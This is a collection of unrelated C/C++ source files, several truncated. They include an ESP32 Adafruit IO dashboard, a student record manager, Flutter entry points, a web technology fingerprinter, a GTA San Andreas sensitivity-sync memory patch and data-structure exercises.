    "#include \"Input.h\"\r\n#include <cstddef>\r\n\r\nnamespace Server_Library\r\n{\r\n    class Input_Control* Input::ptr_Input_Control = NULL;\r\n    class Object* Input::ptr_Buffer_SubSet_InputPraise = NULL;\r\n    __int16 Input::ptr_in_praiseEventId = NULL;\r\n\r\n    Input::Input()\r\n    {\r\n        ptr_Buffer_SubSet_InputPraise = NULL;\r\n        \r\n        ptr_in_praiseEventId = __int16(0);\r\n        while (ptr_in_praiseEventId == NULL) { /* wait untill created */ }\r\n    }\r\n\r\n    Input::~Input()\r\n    {\r\n        delete ptr_Input_Control;\r\n        delete ptr_Buffer_SubSet_InputPraise;\r\n    }\r\n\r\n    void Input::Initialise_Control()\r\n    {\r\n        ptr_Input_Control = new class Server_Library::Input_Control();\r\n        while (ptr_Input_Control == NULL) { /* wait untill created */ }\r\n    }\r\n\r\n    class Input_Control* Input::Get_Input_Control()\r\n    {\r\n        return ptr_Input_Control;\r\n    }\r\n\r\n    __int16 Input::GetPraiseEventId()\r\n    {\r\n        return ptr_in_praiseEventId;\r\n    }\r\n\r\n    class Object* Input::Get_InputBufferSubset()\r\n    {\r\n        return ptr_Buffer_SubSet_InputPraise;\r\n    }\r\n\r\n    void Input::Set_Subset_InputBuffer(Object* value)\r\n    {\r\n        ptr_Buffer_SubSet_InputPraise = value;\r\n    }\r\n\r\n    void Input::SetPraiseEventId(__int16 value)\r\n    {\r\n        ptr_in_praiseEventId = value;\r\n    }\r\n}",
    "#include <WiFi.h>\n#include <HTTPClient.h>\n#include <ArduinoJson.h>\n#include <lvgl.h>\n#include <TFT_eSPI.h>\n#include <XPT2046_Touchscreen.h>\n\n// WiFi credentials\nconst char* ssid = \"*************\";\nconst char* password = \"**************\";\n\n\n// Store date and time\n\n// Adafruit IO credentials\nconst String aio_username = \"*********\";\nconst String aio_key = \"***********************\";\n\n// Adafruit IO Feeds\nconst String temperature_feed = \"/feeds/temperature\";\nconst String humidity_feed = \"/feeds/humidity\";\nconst String ip_feed = \"/feeds/ip\";\nconst String location_feed = \"/feeds/location\";\n\n// TFT Display configuration\n#define SCREEN_WIDTH 240\n#define SCREEN_HEIGHT 320\n#define DRAW_BUF_SIZE (SCREEN_WIDTH * SCREEN_HEIGHT / 10 * (LV_COLOR_DEPTH / 8))\nuint32_t draw_buf[DRAW_BUF_SIZE / 4];\nTFT_eSPI tft = TFT_eSPI();\n\n// Touchscreen configuration\n#define XPT2046_IRQ 36\n#define XPT2046_MOSI 32\n#define XPT2046_MISO 39\n#define XPT2046_CLK 25\n#define XPT2046_CS 33\nSPIClass touchscreenSPI = SPIClass(VSPI);\nXPT2046_Touchscreen touchscreen(XPT2046_CS, XPT2046_IRQ);\n\n// Data placeholders\nString temp_value = \"N/A\";\nString humi_value = \"N/A\";\nString ip_value = \"N/A\";\nString loc_value = \"N/A\";\n\n\nstatic lv_obj_t * table;\nString fetchAdafruitIOData(String feed) {\n  if (WiFi.status() == WL_CONNECTED) {\n    HTTPClient http;\n    String url = \"https://io.adafruit.com/api/v2/\" + aio_username + feed + \"/data/last?x-aio-key=\" + aio_key;\n\n    http.begin(url);\n    int httpCode = http.GET();\n\n    if (httpCode == HTTP_CODE_OK) {\n      String payload = http.getString();\n      Serial.println(\"API Response: \" + payload); // Ki\u1ec3m tra n\u1ed9i dung JSON b\u00ean ngo\u00e0i\n      http.end();\n\n      // Parse outer JSON\n      StaticJsonDocument<512> doc;\n      DeserializationError error = deserializeJson(doc, payload);\n\n      if (error) {\n        Serial.print(\"JSON parsing failed: \");\n        Serial.println(error.c_str());\n        return \"N/A\";\n      }\n\n      // Extract \"value\" field (contains JSON string)\n      if (doc.containsKey(\"value\")) {\n        String valueField = doc[\"value\"];\n        StaticJsonDocument<256> innerDoc;\n        DeserializationError innerError = deserializeJson(innerDoc, valueField);\n\n        if (innerError) {\n          Serial.print(\"JSON parsing failed (inner): \");\n          Serial.println(innerError.c_str());\n          return \"N/A\";\n        }\n\n        // Extract \"data\" field\n        if (innerDoc.containsKey(\"data\")) {\n          if (feed == ip_feed) {\n            // Logic cho IP\n            return String(innerDoc[\"data\"].as<String>());\n          } else if (feed == location_feed) {\n            // Logic cho Location\n            String locData = innerDoc[\"data\"].as<String>();\n            locData.replace(\"-\", \", \"); // \u0110\u1ed5i '-' th\u00e0nh ', ' \u0111\u1ec3 hi\u1ec3n th\u1ecb t\u1ecda \u0111\u1ed9\n            return locData;\n          } else {\n            // Tr\u01b0\u1eddng h\u1ee3p m\u1eb7c \u0111\u1ecbnh\n            return String(innerDoc[\"data\"].as<float>());\n          }\n        } else {\n          Serial.println(\"Inner JSON does not contain 'data' field.\");\n          return \"N/A\";\n        }\n      } else {\n        Serial.println(\"Outer JSON does not contain 'value' field.\");\n        return \"N/A\";\n      }\n    } else {\n      Serial.printf(\"HTTP GET Error, Code: %d\\n\", httpCode);\n      http.end();\n      return \"N/A\";\n    }\n  } else {\n    Serial.println(\"Not connected to Wi-Fi\");\n    return \"N/A\";\n  }\n}\nvoid update_table_values() {\n  temp_value = fetchAdafruitIOData(temperature_feed);\n  humi_value = fetchAdafruitIOData(humidity_feed);\n  ip_value = fetchAdafruitIOData(ip_feed);\n  loc_value = fetchAdafruitIOData(location_feed);\n\n  lv_table_set_cell_value(table, 0, 0, \"Data\");\n  lv_table_set_cell_value(table, 1, 0, \"Temperature\");\n  lv_table_set_cell_value(table, 2, 0, \"Humidity\");\n  lv_table_set_cell_value(table, 3, 0, \"IP\");\n  lv_table_set_cell_value(table, 4, 0, \"Location\");\n\n  lv_table_set_cell_value(table, 0, 1, \"Value\");\n  lv_table_set_cell_value(table, 1, 1, temp_value.c_str());\n  lv_table_set_cell_value(table, 2, 1, humi_value.c_str());\n  lv_table_set_cell_value(table, 3, 1, ip_value.c_str());\n  lv_table_set_cell_value(table, 4, 1, loc_value.c_str());\n}\nstatic void float_button_event_cb(lv_event_t * e) {\n  update_table_values();\n}\nint x, y, z;\n// Function to read touchscreen data\nvoid touchscreen_read(lv_indev_t * indev, lv_indev_data_t * data) {\n  if(touchscreen.tirqTouched() && touchscreen.touched()) {\n    TS_Point p = touchscreen.getPoint();\n    float alpha_x, beta_x, alpha_y, beta_y, delta_x, delta_y;\n\n    alpha_x = -0.000;\n    beta_x = 0.090;\n    delta_x = -33.771;\n    alpha_y = 0.066;\n    beta_y = 0.000;\n    delta_y = -14.632;\n\n    x = alpha_y * p.x + beta_y * p.y + delta_y;\n    x = max(0, x);\n    x = min(SCREEN_WIDTH - 1, x);\n\n    y = alpha_x * p.x + beta_x * p.y + delta_x;\n    y = max(0, y);\n    y = min(SCREEN_HEIGHT - 1, y);\n    z = p.z;\n\n    data->state = LV_INDEV_STATE_PRESSED;\n    data->point.x = x;\n    data->point.y = y;\n\n    Serial.print(\"X = \");\n    Serial.print(x);\n    Serial.print(\" | Y = \");\n   ",
    "#include<iostream>\n#include<string>\n#include<vector>\n#include<fstream>\n#include<limits>\n\n// Class to represent a Student\nclass Student {\nprivate:\n    int id;\n    std::string name;\n    std::string course;\n\npublic:\n    // Constructor\n    Student(int i, std::string n, std::string c) : id(i), name(n), course(c) {}\n\n    // Getters\n    int getId() const { return id; }\n    std::string getName() const { return name; }\n    std::string getCourse() const { return course; }\n\n    // Setters\n    void setName(const std::string& n) { name = n; }\n    void setCourse(const std::string& c) { course = c; }\n};\n\n// Class to manage the SMS\nclass StudentManagementSystem {\nprivate:\n    std::vector<Student> students;\n    const std::string filename = \"students.txt\";\n\n    // Save student data to a file\n    void saveToFile() {\n        std::ofstream file(filename);\n        for (const auto& student : students) {\n            file << student.getId() << \",\" << student.getName() << \",\" << student.getCourse() << \"\\n\";\n        }\n        file.close();\n    }\n\n    // Load student data from a file\n    void loadFromFile() {\n        students.clear();\n        std::ifstream file(filename);\n        std::string line;\n        while (std::getline(file, line)) {\n            int id;\n            std::string name, course;\n            size_t pos;\n            int i = 0;\n\n            while ((pos = line.find(\",\")) != std::string::npos) {\n                if (i == 0) id = std::stoi(line.substr(0, pos));\n                else if (i == 1) name = line.substr(0, pos);\n                line.erase(0, pos + 1);\n                i++;\n            }// https://github.com/3BThakuri/SMS\n            course = line;\n            students.emplace_back(id, name, course);\n        }\n        file.close();\n    }\n\n    // Check if a student with a given ID exists\n    bool studentExists(int id) const {\n        for (const auto& student : students) {\n            if (student.getId() == id) {\n                return true;\n            }\n        }\n        return false;\n    }\n\npublic:\n    // Constructor to initialize and load data\n    StudentManagementSystem() {\n        loadFromFile();\n    }\n\n    // Add a new student\n    void addStudent() {\n        int id;\n        std::string name, course;\n\n        std::cout << \"Enter student ID: \";\n        std::cin >> id;\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n\n        if (studentExists(id)) {\n            std::cout << \"\\n That a student with the same ID is already in the system. (You can't add a new student with the same ID)\\n\";\n            return;\n        }\n\n        std::cout << \"Enter student name: \";\n        std::getline(std::cin, name);\n        std::cout << \"Enter student course: \";\n        std::getline(std::cin, course);\n\n        students.emplace_back(id, name, course);\n        saveToFile();\n        std::cout << \"\\nGreat! The student has been added.\\n\";\n    }\n\n    // Display all students\n    void viewStudents() const {\n        if (students.empty()) {\n            std::cout << \"\\nThere are no students in the system yet.\\n\";\n            return;\n        }\n        std::cout << \"\\nHere are all the students:\\n\";\n        for (const auto& student : students) {\n            std::cout << \"ID: \" << student.getId()\n                      << \", Name: \" << student.getName()\n                      << \", Course: \" << student.getCourse() << \"\\n\";\n        }\n    }\n\n    // Search for a student by ID\n    Student* searchStudentById(int id) {\n        for (auto& student : students) {\n            if (student.getId() == id) {\n                return &student;\n            }\n        }\n        return nullptr;\n    }\n\n    // Update student details\n    void updateStudent() {\n        int id;\n        std::cout << \"\\nEnter the ID of the student you want to update: \";\n        std::cin >> id;\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n\n        Student* student = searchStudentById(id);\n        if (!student) {\n            std::cout << \"\\nSorry, no student found with that ID.\\n\";\n            return;\n        }\n\n        std::string name, course;\n        std::cout << \"\\nDo you want to change the name? Enter a new Name or press Enter to skip: \";\n        std::getline(std::cin, name);\n        if (!name.empty()) student->setName(name);\n\n        std::cout << \"\\nDo you want to change the course? Enter a new Course or press Enter to skip: \";\n        std::getline(std::cin, course);\n        if (!course.empty()) student->setCourse(course);\n\n        saveToFile();\n        std::cout << \"\\nThe student has been updated!\\n\";\n    }\n\n    // Delete a student\n    void deleteStudent() {\n        int id;\n        std::cout << \"\\nEnter the ID of the student you want to delete: \";\n        std::cin >> id;\n            // https://github.com/3BThakuri/SMS\n        for (auto it = students.begin(); it != students.end(); ++it) {\n            if (it->getId() == id) {\n                students.erase(it);\n                saveToFile();\n                std::cout << \"\\nThe student h",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bmi\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*   This software is called MLIP for Machine Learning Interatomic Potentials.\n *   MLIP can only be used for non-commercial research and cannot be re-distributed.\n *   The use of MLIP must be acknowledged by citing approriate references.\n *   See the LICENSE file for details.\n *\n *   This file contributors: Evgeny Podryabinkin\n */\n\n#ifdef MLIP_MPI\n#\tinclude <mpi.h>\n#endif\n#include <string>\n#include <iostream>\n\n#include \"../error_monitor.h\"\n#include \"../mtp.h\"\n#include \"calc_errors.h\"\n\nusing namespace std;\n\n\nvoid CalcErrors(std::vector<std::string>& args, std::map<std::string, std::string>& opts)\n{\n\tint mpi_rank = 0;\n\tint mpi_size = 1;\n#ifdef MLIP_MPI\n\tMPI_Comm_rank(MPI_COMM_WORLD, &mpi_rank);\n\tMPI_Comm_size(MPI_COMM_WORLD, &mpi_size);\n#endif\n\n\tConfiguration cfg;\n\n\t// why if I change MTP to MLMTPR then the results will be different?\n\t// test on Dropbox/../4Evgeny/bug2/\n\tAnyPotential* p_mtp = nullptr;\n\n\t// forward reading .mtp-file to find out the number of components of MTP\n\tint spec_count = 1;\n\t{\n        ifstream ifs(args[0], std::ios::binary);\n\t\tif (!ifs.is_open())\n\t\t\tERROR(\"Can't open file \" + args[0] + \" for reading\");\n\t\twhile (!ifs.eof())\n\t\t{\n\t\t\tstring foo;\n\t\t\tifs >> foo;\n\t\t\tif (foo == \"species_count\")\n\t\t\t{\n\t\t\t\tifs.ignore(999, '=');\n\t\t\t\tifs >> spec_count;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t// to decide mtp or MTPR instantiate\n\tif (spec_count == 1)\n\t{\n\t\tp_mtp = new MTP(args[0]);\n\t\tMessage(\"One-component MTP instantiated\");\n\t}\n\telse\n\t\tERROR(\"Public version has not support multicomponent MTP yet\");\n\n\n\tErrorMonitor errmon(0.0);\n\tConfiguration cfg_orig;\n\n\tstring cfg_save_filename = opts[\"save-to\"];\n\tbool is_save_cfg = false;\n\tofstream ofs;\n\tif (cfg_save_filename != \"\") {\n\t\tif (mpi_size == 1) is_save_cfg = true;\n\t\telse Warning(\"cannot save configuration in the mpi mode\");\n\t\tofs.open(cfg_save_filename, std::ios::binary);\n\t}\n\n\tifstream ifs(args[1], std::ios::binary);\n\tint proc_count = 0;\n\tfor (int count = 0; cfg.Load(ifs); count++)\n\t\tif (count % mpi_size == mpi_rank) {\n\t\t\tcfg_orig = cfg;\n\t\t\tp_mtp->CalcEFS(cfg);\n\t\t\terrmon.collect(cfg_orig, cfg);\n\t\t\tif (is_save_cfg) {\n\t\t\t\tif (cfg.has_energy() && cfg_orig.has_energy())\n\t\t\t\t\tcfg_orig.features[\"energy-error\"] = to_string(std::abs(cfg_orig.energy - cfg.energy));\n\t\t\t\tif (cfg.has_forces() && cfg_orig.has_forces()) {\n\t\t\t\t\tdouble rms_force_err = 0;\n\t\t\t\t\tdouble max_force_err = 0;\n\t\t\t\t\tfor (int i = 0; i < cfg.size(); i++) {\n\t\t\t\t\t\tdouble df = (cfg_orig.force(i) - cfg.force(i)).Norm();\n\t\t\t\t\t\trms_force_err += df*df;\n\t\t\t\t\t\tmax_force_err = __max(max_force_err, df);\n\t\t\t\t\t}\n\t\t\t\t\trms_force_err = sqrt(rms_force_err/ cfg.size());\n\t\t\t\t\tcfg_orig.features[\"force-error-rms\"] = to_string(rms_force_err);\n\t\t\t\t\tcfg_orig.features[\"force-error-max\"] = to_string(max_force_err);\n\t\t\t\t\tcfg_orig.Save(ofs);\n\t\t\t\t}\n\t\t\t}\n\t\t\tproc_count++;\n\t\t}\n\tifs.close();\n\n\tdelete p_mtp;\n\n#ifdef MLIP_MPI\n\terrmon.MPI_Synchronize();\n\n\tif (mpi_rank == 0) {\n      std::string report;\n      errmon.GetReport(report);\n      std::cout << report.c_str();\n  }\n#else\n    std::string report;\n    errmon.GetReport(report);\n    std::cout << report.c_str();\n#endif\n}\n",
    "#include <iostream>\n#include <curl/curl.h>\n#include <regex>\n#include <string>\n#include <unordered_map>\n#include <vector>\n#include <sstream>\n\n// Structure to hold technology details, including detection location\nstruct Technology {\n    std::string name;\n    std::vector<std::pair<std::regex, std::string>> patterns; // Regex and where to search (html, headers, files)\n};\n\n// Callback function to capture the data from cURL response\nsize_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {\n    if (s == nullptr) return 0;\n    s->append(static_cast<char*>(contents), size * nmemb);\n    return size * nmemb;\n}\n\n// Function to fetch content using cURL (reusable)\nstd::string fetchContent(const std::string& url, bool getHeaders = false, std::string* headers = nullptr) {\n    CURL* curl = curl_easy_init();\n    std::string content;\n    CURLcode res;\n\n    if (curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &content);\n        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);\n\n        std::string header_string;\n        if (getHeaders) {\n            curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, WriteCallback);\n            curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);\n        }\n\n        res = curl_easy_perform(curl);\n\n        if (res == CURLE_OK && getHeaders && headers != nullptr) {\n            *headers = header_string;\n        } else if (res != CURLE_OK) {\n            std::cerr << \"cURL request failed for \" << url << \": \" << curl_easy_strerror(res) << std::endl;\n            content = \"\"; // Return empty string on failure\n        }\n        curl_easy_cleanup(curl);\n    } else {\n        std::cerr << \"Failed to initialize cURL.\" << std::endl;\n    }\n    return content;\n}\n\n// Function to parse HTTP headers into a map\nstd::unordered_map<std::string, std::string> parseHeaders(const std::string& headerString) {\n    std::unordered_map<std::string, std::string> headers;\n    std::istringstream headerStream(headerString);\n    std::string line;\n    while (std::getline(headerStream, line)) {\n        if (line.empty() || line == \"\\r\") continue;\n        size_t separator = line.find(':');\n        if (separator != std::string::npos) {\n            std::string key = line.substr(0, separator);\n            std::string value = line.substr(separator + 1);\n            // Trim leading/trailing whitespace from key and value\n            key.erase(0, key.find_first_not_of(\" \\t\"));\n            key.erase(key.find_last_not_of(\" \\t\") + 1);\n            value.erase(0, value.find_first_not_of(\" \\t\"));\n            value.erase(value.find_last_not_of(\" \\t\") + 1);\n            headers[key] = value;\n        }\n    }\n    return headers;\n}\n\n// Function to check for the existence of specific files (e.g., robots.txt)\nbool checkFileExists(const std::string& url) {\n    CURL* curl = curl_easy_init();\n    CURLcode res = CURLE_FAILED_INIT;\n    if (curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // Perform a HEAD request\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n        return res == CURLE_OK;\n    }\n    return false;\n}\n\n// Function to identify technologies based on various methods\nvoid identifyTechnologies(const std::string& url, const std::string& htmlContent, const std::unordered_map<std::string, std::string>& headers) {\n    std::vector<Technology> technologies = {\n        {\"WordPress\", {\n            {std::regex(\"wp-(content|includes)\", std::regex::icase), \"html\"},\n            {std::regex(\"wordpress\", std::regex::icase), \"headers:x-powered-by\"},\n            {std::regex(\"/wp-login\\\\.php\", std::regex::icase), \"files\"}\n        }},\n        {\"jQuery\", {\n            {std::regex(\"jquery[-.\\\\d]*(?:\\\\.min)?\\\\.js\", std::regex::icase), \"html\"}\n        }},\n        {\"React\", {\n            {std::regex(\"react(-dom)?\\\\.production\\\\.min\\\\.js|ReactDOM\", std::regex::icase), \"html\"}\n        }},\n        {\"Angular\", {\n            {std::regex(\"angular(?:\\\\.min)?\\\\.js\", std::regex::icase), \"html\"}\n        }},\n        {\"Node.js\", {\n            {std::regex(\"Powered by Node\\\\.js\", std::regex::icase), \"html\"},\n            {std::regex(\"node\", std::regex::icase), \"headers:x-powered-by\"}\n        }},\n        {\"Bootstrap\", {\n            {std::regex(\"bootstrap(?:\\\\.min)?\\\\.css\", std::regex::icase), \"html\"}\n        }},\n        {\"Vue.js\", {\n            {std::regex(\"vue(?:\\\\.min)?\\\\.js\", std::regex::icase), \"html\"}\n        }},\n        {\"PHP\", {\n            {std::regex(\"<\\?php\", std::regex::icase), \"html\"},\n            {std::regex(\"PHP/\", std::regex::icase), \"headers:x-powered-by\"},\n            {std::regex(\"\\\\.php$\", std::regex::icase), \"files\"} // Check for PHP file extensions\n        }},\n        {\"Nginx\", {\n            {std::regex(\"nginx\", std::regex::icase), \"headers:server\"}\n        }}",
    "/*\r\n\r\n\tSUBJECT:        GTA San andreas Y-Axis senstivity fix (Sync with X)\r\n        VERSION:        1.0.0\r\n\r\n*/\r\n\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <tchar.h>\r\n#include <Psapi.h>\r\n#pragma comment (lib, \"psapi.lib\")\r\n\r\nsize_t r_wcsstr(const wchar_t* str, const wchar_t* search)\r\n{\r\n    for (size_t i = wcslen(str) - wcslen(search); i > 0; --i)\r\n    {\r\n        if (wcsstr(str + i, search) != NULL)\r\n            return i + 1;\r\n    }\r\n\r\n    return -1;\r\n}\r\n\r\nbool GetProcessID(const std::wstring& name, DWORD& pid)\r\n{\r\n    DWORD aProcesses[1024]{ 0 };\r\n    DWORD cbNeeded{ 0 };\r\n    DWORD cProcesses{ 0 };\r\n\r\n    unsigned int i;\r\n\r\n    if (EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded) == 0)\r\n        return false;\r\n\r\n    cProcesses = cbNeeded / sizeof(DWORD);\r\n\r\n    for (i = 0; i < cProcesses; i++)\r\n    {\r\n        WCHAR module_name[MAX_PATH]{ 0 };\r\n        HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);\r\n\r\n        if (process == NULL ||\r\n            GetProcessImageFileNameW(process, module_name, sizeof(module_name) / sizeof(WCHAR)) == 0)\r\n            continue;\r\n\r\n        size_t pos = r_wcsstr(module_name, name.c_str());\r\n\r\n        if (pos != -1)\r\n        {\r\n            pid = aProcesses[i];\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nint main()\r\n{\r\n    DWORD ProcessID{ 0 };\r\n    DWORD XSenstivity = 0xB6EC1C;\r\n    DWORD YSenstivity = 0xB6EC18;\r\n    float XSensValue = 0;\r\n    GetProcessID(L\"gta_sa.exe\", ProcessID);\r\n\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, ProcessID);\r\n\tif (hProcess == NULL)\r\n\t{\r\n\t\tMessageBoxA(NULL, \"Game not found!\\nRun the script as an Administrator or open your Game.\", \"CuteLittleScript\", MB_ICONERROR);\r\n\t\treturn 1;\r\n\t}\r\n    std::cout << \"Process ID That We Detected: \" << ProcessID;\r\n    while (true)\r\n\t{\r\n\t\tSleep(1000);\r\n\t\tReadProcessMemory(hProcess, (LPCVOID)(XSenstivity), &XSensValue, 4, NULL);\r\n\t\tWriteProcessMemory(hProcess, (LPVOID)(YSenstivity), &XSensValue, 4, NULL);\r\n\t}\r\n\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_with_ai\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#ifndef __PROGTEST__\n#include <cassert>\n#include <iomanip>\n#include <cstdint>\n#include <iostream>\n#include <memory>\n#include <limits>\n#include <optional>\n#include <algorithm>\n#include <bitset>\n#include <list>\n#include <array>\n#include <vector>\n#include <deque>\n#include <unordered_set>\n#include <unordered_map>\n#include <stack>\n#include <queue>\n#include <random>\n#include <type_traits>\n#include <utility>\n\n#endif\n\n\ntemplate < typename T>\nstruct Node {\n    T value;\n    Node<T>* parent;\n    Node<T>* left;\n    Node<T>* right;\n    int depth;\n    int size; // \u0420\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u0434\u0434\u0435\u0440\u0435\u0432\u0430\n\n    Node(const T& val) : value(val), parent(nullptr), left(nullptr), right(nullptr), depth(0), size(1) {}\n\n    static void updateDepthAndSize(Node<T>* node) {\n        if (node) {\n            int left_depth = node->left ? node->left->depth : -1;\n            int right_depth = node->right ? node->right->depth : -1;\n            node->depth = std::max(left_depth, right_depth) + 1;\n\n            int left_size = node->left ? node->left->size : 0;\n            int right_size = node->right ? node->right->size : 0;\n            node->size = 1 + left_size + right_size;\n        }\n    }\n\n\n    static Node<T>* findByIndex(Node<T>* node, size_t index) {\n        while (node) {\n            int leftSize = node->left ? node->left->size : 0;\n            if (index < (size_t)leftSize) {\n                node = node->left;\n            } else if (index == (size_t)leftSize) {\n                return node;\n            } else {\n                index -= leftSize + 1;\n                node = node->right;\n            }\n        }\n        return nullptr;\n    }\n\n\n    static Node<T>* insertByIndex(Node<T>*& node, size_t index, T value, Node<T>* parent = nullptr) {\n        if (!node) {\n            node = new Node<T>(value);\n            node->parent = parent;\n            return node;\n        }\n\n        int leftSize = node->left ? node->left->size : 0;\n\n        Node<T>* insertedNode = nullptr;\n\n        if (index <= (size_t)leftSize) {\n            insertedNode = insertByIndex(node->left, index, value, node);\n        } else {\n            insertedNode = insertByIndex(node->right, index - leftSize - 1, value, node);\n        }\n\n        updateDepthAndSize(node);\n\n        node = balance(node);\n\n        return insertedNode; // \u0412\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0432\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0439 \u0443\u0437\u0435\u043b\n    }\n\n\n\n\n\n\n\n    static Node<T>* eraseByIndex(Node<T>*& node, size_t index) {\n        if (!node) return nullptr;\n\n        int leftSize = node->left ? node->left->size : 0;\n\n        if (index < (size_t)leftSize) {\n            node->left = eraseByIndex(node->left, index);\n            if (node->left) node->left->parent = node;\n        } else if (index == (size_t)leftSize) {\n\n            if (!node->left || !node->right) {\n                Node<T>* temp = node->left ? node->left : node->right;\n                if (temp) temp->parent = node->parent;\n                delete node;\n                node = temp;\n            } else {\n\n                Node<T>* successor = minValueNode(node->right);\n                node->value = successor->value;\n                node->right = eraseByIndex(node->right, 0);\n                if (node->right) node->right->parent = node;\n            }\n        } else {\n            node->right = eraseByIndex(node->right, index - leftSize - 1);\n            if (node->right) node->right->parent = node;\n        }\n\n        if (node) {\n            updateDepthAndSize(node);\n\n\n            node = balance(node);\n        }\n\n        return node;\n    }\n\n\n    static Node<T>* eraseByIndexAndReturnNode(Node<T>*& node, size_t index, Node<T>*& removedNode) {\n        if (!node) return nullptr;\n\n        int leftSize = node->left ? node->left->size : 0;\n\n        if (index < (size_t)leftSize) {\n            node->left = eraseByIndexAndReturnNode(node->left, index, removedNode);\n            if (node->left) node->left->parent = node;\n        } else if (index == (size_t)leftSize) {\n\n            removedNode = node;\n\n            if (!node->left || !node->right) {\n                Node<T>* temp = node->left ? node->left : node->right;\n                if (temp) temp->parent = node->parent;\n                node = temp;\n            } else {\n\n                Node<T>* successor = minValueNode(node->right);\n\n                std::swap(node->value, successor->value);\n                node->right = eraseByIndexAndReturnNode(node->right, 0, removedNode);\n                if (node->right) node->right->parent = node;\n            }\n        } else {\n            node->right = eraseByIndexAndReturnNode(node->right, index - leftSize - 1, removedNode);\n            if (node->right) node->right->parent = node;\n        }\n\n        if (node) {\n            updateDepthAndSize(node);\n            node = balance(node);\n        }\n\n        return node;\n    }\n\n\n    static Node<T>* minValueNode(Node<T>* node) {\n        Node<T>* current = node;\n        while (current && current->left != nullptr)\n            current = current->left;\n        return current;\n    }\n\n    static int getBalanc",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nclass Node {\npublic:\n    int index;\n    int data;\n    Node* next;\n    Node* prev;\n\n    Node(int index, int data) : index(index), data(data), next(nullptr), prev(nullptr) {}\n};\n\nclass ArrayDoubleLinkedList {\nprivate:\n    Node* head;\n    Node* tail;\n    int size;\n    int elements;\n\npublic:\n    ArrayDoubleLinkedList(int n) : head(nullptr), tail(nullptr), size(n), elements(0) {}\n\n    ~ArrayDoubleLinkedList() {\n        Node* current = head;\n        while (current) {\n            Node* nextNode = current->next;\n            delete current;\n            current = nextNode;\n        }\n    }\n\n    Node *getIndex(int index, bool is) {\n        if (index < 0 || index >= size) \n            return nullptr;\n\n        Node *prev = head;\n        while (prev && prev->next && prev->next->index < index)\n            prev = prev->next;\n\n        if (prev && prev->next && prev->next->index == index)\n            return prev->next;\n        \n        if (is)\n            return add_after(prev, 0, index);\n        return nullptr;\n    }\n\n    void link(Node* first, Node* second) {\n        if (first) {\n            first->next = second;\n        }\n        if 